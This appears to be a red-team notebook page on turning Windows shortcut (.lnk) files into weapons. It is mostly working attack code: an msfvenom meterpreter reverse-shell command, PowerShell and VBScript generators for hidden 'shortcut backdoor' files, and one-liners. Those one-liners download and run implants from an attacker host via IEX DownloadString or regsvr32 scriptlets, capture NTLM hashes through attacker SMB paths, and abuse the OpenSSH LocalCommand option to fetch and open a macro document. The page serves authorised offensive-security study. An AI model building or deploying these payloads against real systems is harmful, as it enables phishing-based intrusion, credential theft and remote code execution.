# Living off the Land

## 01 - Custom Icons

```
C:\Windows\System32\msi.dll
C:\Program Files (x86)\Microsoft Office\root\Office16\WINWORD.exe
```

## 02 - Generate Shortcut

### 2.1 - PowerShell

> [!NOTE] Characters Limit
> The **TargetPath** has a limit of 260 characters long. If you're using powershell payload then it's recommended to use `psh-cmd` format instead of `psh`, `psh-reflection`, and `psh-net`.

```
$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> lport=<PORT> exitfunc=thread -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | base64 -d > implant.ps1
```

TODO: Remove timestamps in the .lnk file

`$ cat pwsh_cmds.txt`

---

```powershell
$shortcutPath = "C:\Users\" + $Env:USERNAME + "\Desktop\mal.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutPath)
$Shortcut.TargetPath = 'C:\Windows\System32\cmd.exe'
$Shortcut.Arguments = '/c regsvr32 /s /n /u /i:http://<IP>/implant.sct scrobj.dll'
# $Shortcut.TargetPath = 'conhost.exe'
# $Shortcut.Arguments = "--headless powershell.exe -nop -NonI -Nologo -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http://<IP>/implant.ps1`'))`"`""
$Shortcut.Description = "A shortcut backdoor"
# $Shortcut.IconLocation = 'C:\path\to\icon.ico'
$Shortcut.IconLocation = 'shell32.dll,21'
$Shortcut.hotkey = 'CTRL+C' # A hotkey to trigger the payload
$Shortcut.WindowStyle = 7   # 1 - Normal, 3 - Maximized, 7 - Minimized
$Shortcut.WorkingDirectory = "C:\Users\" + $Env:USERNAME + "\Public"
$Shortcut.Save()
```

### 2.2 - VBScript

```vbscript
Set ObjectWScript = WScript.CreateObject("WScript.Shell")

' Arguments: target executable, target arguments, shortcut file
stringTargetPath = WScript.Arguments(0)
stringTargetArguments = WScript.Arguments(1)
ShortcutFile = WScript.Arguments(2)

Set objLink = ObjectWScript.CreateShortcut(ShortcutFile)

objLink.TargetPath = stringTargetPath
objLink.Arguments = stringTargetArguments
objLink.Description = "A shortcut backdoor"
' objLink.IconLocation = "shell32.dll,21"
objLink.WindowStyle = 7
' objLink.WorkingDirectory = "C:\Users\Public"
objLink.Save
```

To execute the script with `wine` by generating a shortcut `.lnk` file.

```
$ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\conhost.exe" "--headless powershell.exe -nop -NonI -Nologo -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http[s]://<IP>:<PORT>/implant.ps1'))""" shortcut_file.lnk

$ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\cmd.exe" "/c powershell.exe -nop -NonI -Nologo -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http[s]://<IP>:<PORT>/implant.ps1'))""" shortcut_file.lnk
```

## 03 - Use Cases

```
$ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\conhost.exe" "--headless powershell -ep bypass -f implant.ps1" shortcut_file.lnk
```

### 3.2 - Capture NTLM Relay

```
$ wine wscript '//Nologo' '//B' generate_lnk.vbs "file://<attacker_IP>/@snare" "" file.lnk

$ wine wscript '//Nologo' '//B' generate_lnk.vbs "\\\\<attacker_IP>\\snare" "" file.lnk
```

Scriptlet file

```
$ wine wscript '//Nologo' '//B' generate_lnk.vbs "regsvr32" "/s /u /i://<attacker_IP>/@snare scrobj.dll" file.lnk
```

TODO: Provide use cases if any (refer to the link for SSH)

```
$ wine wscript '//Nologo' '//B' generate_lnk.vbs "ssh" "-i \\\\<attacker_IP>\\key.pem root@<IP>"
```

```
C:\Windows\System32\OpenSSH\ssh.exe -o "PermitLocalCommand=yes" -o "LocalCommand=scp <username>@<attacker_IP>:macro_document.doc %AppData%\Microsoft\Templates\macro_document.doc\. && %AppData%\Microsoft\Templates\macro_document.doc" <username>@<attacker_IP>
```

---
## References

### Backlinks

- [[01 - Capture Hashes via Spoof SMB Shares|Responder: Capture Hashes via Spoof SMB Shares Scenario]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Authentication Relay/Metasploit|Metasploit: Capture Hashes]]

- [[HTA Web Server|Metasploit: HTA Web Server]]

- [[SMB Delivery|Metasploit: SMB Delivery]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Web Drive-by/Linux/C2 Frameworks|Metasploit: Web Delivery]]

### Github

- [rvrsh3ll: Create-HotKeyLNK.ps1](https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Create-HotKeyLNK.ps1)

- [nobodyatall648: Malicious LNK File Abuse Hotkey Feature](https://github.com/nobodyatall648/Malicious-LNK-File-Abuse-Hotkey-Feature)

- [B00merang-Artwork: Windows 10](https://github.com/B00merang-Artwork/Windows-10)

### Hull1

- [Hull1.com: Customize Shortcut Icon](https://www.hull1.com/scriptit/2020/08/15/customize-shortcut-icon.html)

### Bordergate

- [Bordergate: Disguising Client Side Payloads](https://www.bordergate.co.uk/disguising-client-side-payloads/)

### Pentestlab

- [Pentestlab Blog: Persistence Shortcut Modification](https://pentestlab.blog/2019/10/08/persistence-shortcut-modification/)

### Hacking Articles

- [Hacking Articles: Windows Persistence Shortcut Modification](https://www.hackingarticles.in/windows-persistence-shortcut-modification-t1547/)

### DMCXBLUE

- [DMCXBLUE: Capturing Hashes](https://dmcxblue.net/2020/06/17/capturing-hashes/)

### Osanda

- [Osanda: Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)

### Assume Breach

- [Assume Breach: Using LNK Files To Bypass Applocker](https://assume-breach.medium.com/home-grown-red-team-using-lnk-files-to-bypass-applocker-3fb1ecae291f)

- [Assume Breach: LNK Phishing Revisited In 2023](https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-revisited-in-2023-364daf70a06a)

- [Assume Breach: LNK Phishing In 2023 Revisited…Again](https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-in-2023-revisited-again-2b8c885b9836)

### RedSiege

- [RedSiege: SSHishing – Abusing Shortcut Files and the Windows SSH Client for Initial Access](https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/)

### B4ckdoor

- [b4ckdoor: Is Macro Phishing Dead in 2024? — A Scheduled Task for Initial Access and Persistence using macro by Abusing Shortcut Files and SSH](https://b4ckdoor.medium.com/is-macro-phishing-dead-in-2024-56b7b4473a29)

### BadOption

- [BadOption: ZipLink - Combine Zips and Lnk for fun and profit](https://badoption.eu/blog/2023/09/28/ZipLink.html)